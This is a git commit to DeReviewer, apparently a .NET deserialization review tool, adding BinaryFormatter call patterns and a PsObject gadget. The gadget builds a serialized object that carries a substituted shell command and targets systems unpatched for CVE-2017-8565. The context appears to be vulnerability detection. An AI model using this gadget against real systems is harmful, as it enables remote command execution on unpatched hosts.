ed03e0206d75321a2c5b399e9eb3fe009e5e9f90
Andrei Medvedev <super.user.maa@gmail.com>
2019-08-12 23:38:39 +0300

    Implemented PsObject gadget and added few patterns for binary formatter

--- DeReviewer.KnowledgeBase/Cases/BinaryFormatterPatterns.cs
+++ DeReviewer.KnowledgeBase/Cases/BinaryFormatterPatterns.cs
@@ -4,52 +4,98 @@ using DeReviewer.KnowledgeBase.Gadgets;
 
 namespace DeReviewer.KnowledgeBase.Cases
 {
-    public class BinaryFormatterPatterns : Case
+  public class BinaryFormatterPatterns : Case
+  {
+    public void DeserializeTypeConfuseDelegate()
     {
-        public void Deserialize()
-        {
-            var serializer = new BinaryFormatter();
-            Pattern.CreateBySignature(it =>
-                serializer.Deserialize(
-                    it.IsPayloadOf<TypeConfuseDelegate>().Format<Binary>()));
-        }
-        
-        public void DeserializeHeaderHandler()
-        {
-            var serializer = new BinaryFormatter();
-            Pattern.CreateBySignature(it =>
-                serializer.Deserialize(
-                    it.IsPayloadOf<TypeConfuseDelegate>().Format<Binary>(),
-                    null));
-        }
-        
-        public void DeserializeMethodResponse()
-        {
-            var serializer = new BinaryFormatter();
-            Pattern.CreateBySignature(it =>
-                serializer.DeserializeMethodResponse(
-                    it.IsPayloadOf<TypeConfuseDelegate>().Format<Binary>(),
-                    null,
-                    null));
-        }
-        
-        public void UnsafeDeserialize()
-        {
-            var serializer = new BinaryFormatter();
-            Pattern.CreateBySignature(it =>
-                serializer.UnsafeDeserialize(
-                    it.IsPayloadOf<TypeConfuseDelegate>().Format<Binary>(),
-                    null));
-        }
-
-        public void UnsafeDeserializeMethodResponse()
-        {
-            var serializer = new BinaryFormatter();
-            Pattern.CreateBySignature(it =>
-                serializer.UnsafeDeserializeMethodResponse(
-                    it.IsPayloadOf<TypeConfuseDelegate>().Format<Binary>(),
-                    null,
-                    null));
-        }
+      var serializer = new BinaryFormatter();
+      Pattern.CreateBySignature(it =>
+          serializer.Deserialize(
+              it.IsPayloadOf<TypeConfuseDelegate>().Format<Binary>()));
     }
+
+    public void DeserializePsObject()
+    {
+      var serializer = new BinaryFormatter();
+      Pattern.CreateBySignature(it =>
+        serializer.Deserialize(
+          it.IsPayloadOf<PsObject>().Format<Binary>()));
+    }
+
+    public void DeserializeHeaderHandlerTypeConfuseDelegate()
+    {
+      var serializer = new BinaryFormatter();
+      Pattern.CreateBySignature(it =>
+          serializer.Deserialize(
+              it.IsPayloadOf<TypeConfuseDelegate>().Format<Binary>(),
+              null));
+    }
+
+    public void DeserializeHeaderHandlerPsObject()
+    {
+      var serializer = new BinaryFormatter();
+      Pattern.CreateBySignature(it =>
+            serializer.Deserialize(
+              it.IsPayloadOf<PsObject>().Format<Binary>(),
+              null));
+    }
+
+    public void DeserializeMethodResponseTypeConfuseDelegate()
+    {
+      var serializer = new BinaryFormatter();
+      Pattern.CreateBySignature(it =>
+          serializer.DeserializeMethodResponse(
+              it.IsPayloadOf<TypeConfuseDelegate>().Format<Binary>(),
+              null,
+              null));
+    }
+
+    public void DeserializeMethodResponsePsObject()
+    {
+      var serializer = new BinaryFormatter();
+      Pattern.CreateBySignature(it =>
+        serializer.DeserializeMethodResponse(
+          it.IsPayloadOf<PsObject>().Format<Binary>(),
+          null,
+          null));
+    }
+
+    public void UnsafeDeserializeTypeConfuseDelegate()
+    {
+      var serializer = new BinaryFormatter();
+      Pattern.CreateBySignature(it =>
+          serializer.UnsafeDeserialize(
+              it.IsPayloadOf<TypeConfuseDelegate>().Format<Binary>(),
+              null));
+    }
+
+    public void UnsafeDeserializePsObject()
+    {
+      var serializer = new BinaryFormatter();
+      Pattern.CreateBySignature(it =>
+        serializer.UnsafeDeserialize(
+          it.IsPayloadOf<PsObject>().Format<Binary>(),
+          null));
+    }
+
+    public void UnsafeDeserializeMethodResponseTypeConfuseDelegate()
+    {
+      var serializer = new BinaryFormatter();
+      Pattern.CreateBySignature(it =>
+          serializer.UnsafeDeserializeMethodResponse(
+              it.IsPayloadOf<TypeConfuseDelegate>().Format<Binary>(),
+              null,
+              null));
+    }
+
+    public void UnsafeDeserializeMethodResponsePsObject()
+    {
+      var serializer = new BinaryFormatter();
+      Pattern.CreateBySignature(it =>
+        serializer.UnsafeDeserializeMethodResponse(
+          it.IsPayloadOf<PsObject>().Format<Binary>(),
+          null,
+          null));
+    }
+  }
 }
---
+++ DeReviewer.KnowledgeBase/Gadgets/PsObject.cs
@@ -0,0 +1,39 @@
+﻿using System;
+using System.IO;
+using System.Management.Automation;
+using System.Runtime.Serialization;
+using System.Runtime.Serialization.Formatters.Binary;
+
+namespace DeReviewer.KnowledgeBase.Gadgets
+{
+  //  PsObject Gadget by Alvaro Munoz and Oleksandr Mirosh.
+  //  Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017)
+  internal class PsObject : IGadget
+  {
+    public object Build(string command)
+    {
+      string clixmlData = File.ReadAllText(@"Payloads\PsObject.clixml")
+        .Replace("%CMD%", command);
+
+      return new PsObjectMarshal(clixmlData);
+    }
+  }
+
+  [Serializable]
+  internal class PsObjectMarshal : ISerializable
+  {
+    private readonly string clixmlData;
+
+    public void GetObjectData(SerializationInfo info, StreamingContext context)
+    {
+      Type typePso = typeof(PSObject);
+      info.SetType(typePso);
+      info.AddValue("CliXml", clixmlData);
+    }
+
+    public PsObjectMarshal(string clixmlData)
+    {
+      this.clixmlData = clixmlData;
+    }
+  }
+}
